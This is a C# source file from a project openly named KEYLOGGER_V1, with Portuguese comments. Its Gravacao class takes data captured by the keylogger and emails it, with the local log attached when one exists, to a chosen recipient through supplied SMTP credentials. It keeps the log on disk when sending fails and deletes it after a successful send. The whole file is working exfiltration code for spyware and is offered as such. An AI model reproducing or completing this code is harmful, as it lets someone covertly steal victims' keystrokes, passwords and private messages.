using KEYLOGGER_V1.Log;
using KEYLOGGER_V1.Email;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;



namespace KEYLOGGER_V1
{
    public class Gravacao
    {

        #region Construtor
        /// <summary>
        ///  Construtor padrão de gravação
        /// </summary>
        public Gravacao()
        {

        }
        #endregion

        #region Metodos
        #region metodos de Armazenamentos
        /// <summary>
        ///  Metodo de armazenar dados recolhidos pelo key
        /// </summary>
        /// <param name="login">Email de envio </param>
        /// <param name="senha">Senha de envio </param>
        /// <param name="conteudo">Conteudo de envio do corpo do email</param>
        /// <param name="remetente">Email de quem esta enviando</param>
        /// <param name="destinatario">Para quem esta enviando o email</param>
        /// <param name="assunto">O assunto do email</param>
        /// <param name="nomeArquivo">Nome do arquivo de log</param>
        /// <param name="dirLog"> Caminho de onde será armazenado o log </param>
        public void Armazenar(string login, string senha, string conteudo, string remetente, string destinatario, string assunto, string nomeArquivo, string dirLog)
        {

            #region Enviar email com Anexo
            
            LogServico logRecursos = new LogServico(dirLog);
            if (logRecursos.Contem())
            {
                
                EmailServico emailAnexo = new EmailServico(login, senha, remetente, destinatario, assunto, conteudo, dirLog);
                if (!emailAnexo.EnviarAnexo())
                {
                    LogServico servicoLog = new LogServico(dirLog, conteudo, nomeArquivo);
                    servicoLog.Atualizar();
                }
                else
                    logRecursos.Excluir();

            }

            #endregion

            #region Enviar email sem Anexo
            else
            {
                EmailServico email = new EmailServico(login, senha, remetente, destinatario, assunto, conteudo);
                if (!email.Enviar())
                {
                    LogServico servicoLog = new LogServico(dirLog, conteudo, nomeArquivo);
                    servicoLog.Atualizar();
                }
            }
            #endregion

        }
        #endregion

        #endregion

    }
}
